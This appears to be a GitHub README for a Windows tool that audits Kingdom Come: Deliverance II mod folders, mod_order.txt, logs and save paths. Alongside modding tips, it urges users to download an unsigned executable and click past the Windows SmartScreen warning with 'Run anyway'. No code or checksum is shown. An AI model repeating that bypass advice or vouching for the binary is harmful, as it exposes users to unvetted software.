<p align="center">
  <img src="https://i.postimg.cc/prrrh4bV/banner.png" alt="KCD2 Mod Order Inspector — mod.manifest, mod_order.txt & Save Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Mod%20Manifest%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-kcd2--mod--check--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# KCD2 Mod Order Inspector — mod.manifest, mod_order.txt & Save Checks for Windows

**Kingdom Come: Deliverance II ignoring your installed mods? Two mods overwriting the same UI or combat table, or infinite loading screens after a game update? Inspect your Mods folder structure and mod_order.txt before reinstalling.**

KCD2 Mod Order Inspector focuses on CryEngine's mod discovery rules in Kingdom Come: Deliverance II: **each mod folder must expose `mod.manifest` at its immediate root**, `mod_order.txt` controls override priority when multiple `.pak` files touch the same XML tables, and player playline saves reside separately in `Saved Games\kingdomcome2`.

This project is aimed at **Kingdom Come: Deliverance II on Windows (Steam)**. It concerns `Mods` directory hierarchy, `mod.manifest` validation, `mod_order.txt` formatting, and local save backups—not redistributing mods or editing `.whs` saves.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Mod extracted into `Mods\` is ignored in-game | Double-nested archive folder (`Mods\Mod\Mod\mod.manifest`) | Ensure `mod.manifest` sits directly inside `Mods\<ModName>\` |
| Two mods overwrite the same UI or combat table | Missing or unsorted `Mods\mod_order.txt` load order | Verify `mod_order.txt` lists mod IDs in explicit override order |
| Broken menus or infinite load after patch | Outdated `.pak` table override inside `Mods\<Mod>\Data\` | Isolate `Mods\` folders and inspect `kcd.log` for mount errors |
| Protecting playline saves before overhaul mods | Persistent script edits written into `.whs` save files | Back up `%USERPROFILE%\Saved Games\kingdomcome2\saves` |

## Download for Windows

[**Download KCD2ModCheck.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/KCD2ModCheck.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `KCD2ModCheck.exe`? (Automatic checks in ~2 seconds)

- Scans every subfolder in `KingdomComeDeliverance2\Mods` and verifies a root `mod.manifest` exists.
- Flags double-nested archive folders that CryEngine silently skips on startup.
- Checks `Mods\mod_order.txt` and scans `kcd.log` for `.pak` mount or XML parse errors.
- Locates `%USERPROFILE%\Saved Games\kingdomcome2\saves` and counts active playline `.whs` files.

### Sample Diagnostic Output

```text
[KCD2ModCheck] Auditing Kingdom Come: Deliverance II Mods & Saves...
[OK]   Game Install     : D:\SteamLibrary\steamapps\common\KingdomComeDeliverance2
[OK]   mod_order.txt    : Present (6 entries)
[OK]   Mods\UnlimitedSaving : OK (mod.manifest at root)
[WARN] Mods\BetterUI        : WARN - mod.manifest nested inside BetterUI\BetterUI\!
[OK]   Saved Games      : C:\Users\Player\Saved Games\kingdomcome2\saves (19 .whs files)
```

The release ZIP is named `KCD2ModCheck.zip`; the Windows executable inside is named `KCD2ModCheck.exe`.

1. Close Kingdom Come: Deliverance II before moving or checking game files.
2. Click **Download KCD2ModCheck.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `KCD2ModCheck.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Kingdom Come: Deliverance II and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Kingdom Come: Deliverance II, and access to `Saved Games`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `KCD2ModCheck.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Mod extracted into `Mods` does nothing in-game

Extracting archives with 'Extract to folder' often creates double-nested paths like `Mods\MyMod\MyMod\mod.manifest`. CryEngine ignores any mod whose `mod.manifest` is not directly inside `Mods\<ModFolder>\`.

### Conflicting mods overwrite each other unpredictably

When `Mods\mod_order.txt` is absent, the game loads mods alphabetically by folder name. Adding `mod_order.txt` enforces explicit load priority so patches and compatibility overrides load last.

### Broken menus or infinite loading after an official patch

Mods that replace UI `.gfx` or database `.xml` tables inside `Data\*.pak` frequently conflict with updated base game `.pak` archives after a patch.

### Need safe save backups before testing gameplay overhauls

Local playline saves (`*.whs`) are stored under `%USERPROFILE%\Saved Games\kingdomcome2\saves`. Backing up this directory protects your campaign before testing heavy mods.

## Where Kingdom Come: Deliverance II files normally belong

On Windows Steam installations, mods live inside the game directory while saves live in your user profile:

```text
%ProgramFiles(x86)%\Steam\steamapps\common\KingdomComeDeliverance2\Mods\
```

Inside that structure, key files and subdirectories typically look like this:

```text
KingdomComeDeliverance2\
├── kcd.log
└── Mods\
    ├── mod_order.txt
    └── YourModFolder\
        ├── mod.manifest
        └── Data\
            └── YourMod.pak

%USERPROFILE%\Saved Games\kingdomcome2\saves\
```

If you use Steam Workshop subscriptions alongside manual `Mods` folders, check `kcd.log` in the root game directory to see the exact order in which CryEngine mounted each `.pak`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Kingdom Come: Deliverance II completely.** Exit the game and allow Steam Cloud sync to finish before modifying `Mods` or `Saved Games`.
2. **Back up `%USERPROFILE%\Saved Games\kingdomcome2`.** Copy your entire `kingdomcome2` save folder to a dated backup folder in Documents.
3. **Check every mod folder for a root `mod.manifest`.** Ensure no mod has an extra wrapper folder hiding its `mod.manifest` and `Data` subfolder.
4. **Verify `mod_order.txt` entries.** Confirm each line in `Mods\mod_order.txt` matches the exact mod ID defined in `mod.manifest`.
5. **Inspect `kcd.log` for mount errors.** Open `kcd.log` in the root game directory to confirm your mods mounted without XML parse errors.
6. **Isolate outdated `.pak` mods after game updates.** Temporarily move `Mods` subfolders out and reintroduce them one by one after an official patch.
7. **Restart the game cleanly.** Launch via Steam and verify mod behavior on a test save before overwriting your main playline.

### Before moving any files

Always keep a dated copy of `%USERPROFILE%\Saved Games\kingdomcome2` outside your user profile before removing mods that add items, perks, or quests.

## What an effective diagnostic report should tell you

A clear mod audit checks **every subfolder in `KingdomComeDeliverance2\Mods` for a valid root `mod.manifest`**, verifies `mod_order.txt` presence, scans `kcd.log` for mount warnings, and confirms your `Saved Games\kingdomcome2` backup target.

## FAQ

**Where do Kingdom Come: Deliverance II manual mods go?**

Place each mod folder inside `steamapps\common\KingdomComeDeliverance2\Mods\` so that `mod.manifest` is directly inside `Mods\<ModFolder>\`.

**How does mod_order.txt work in KCD2?**

Create a plain-text `mod_order.txt` inside `Mods\` listing mod IDs one per line in the order they should load (later entries override earlier ones).

**Where are KCD2 save files stored on Windows?**

Local saves are stored under `%USERPROFILE%\Saved Games\kingdomcome2\saves\`.

**Why did my UI break after a KCD2 patch?**

UI and localization `.pak` mods often need updates after official patches; move them out of `Mods\` temporarily to confirm.

**Does this tool edit .whs save files?**

No. It inspects directory structure, manifests, and logs without altering saves.

**Are third-party mods bundled with this repository?**

No mods or copyrighted game files are included. Download mods directly from their authors.

## Useful reading

- [Kingdom Come: Deliverance II on Steam](https://store.steampowered.com/app/1771300/Kingdom_Come_Deliverance_II/)
- [Official Kingdom Come: Deliverance II Website](https://www.kingdomcomerpg.com/)

## More Windows Game Diagnostic Tools

- [BG3-ModSettingsDoctor](../BG3-ModSettingsDoctor) — Baldur's Gate 3 `modsettings.lsx` & Script Extender audit
- [SkyrimSE-SKSEPluginAudit](../SkyrimSE-SKSEPluginAudit) — Skyrim SE `skse64.log` & DLL plugin compatibility audit
- [Starfield-PluginsOrderDoctor](../Starfield-PluginsOrderDoctor) — Starfield `Plugins.txt` & `StarfieldCustom.ini` load order check
- [PBZ-UE4SSLoaderCheck](../PBZ-UE4SSLoaderCheck) — Phantom Blade Zero `UE4SS.log` AOB & `~mods` loader check

*Independent community project. Not affiliated with Warhorse Studios, Deep Silver, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
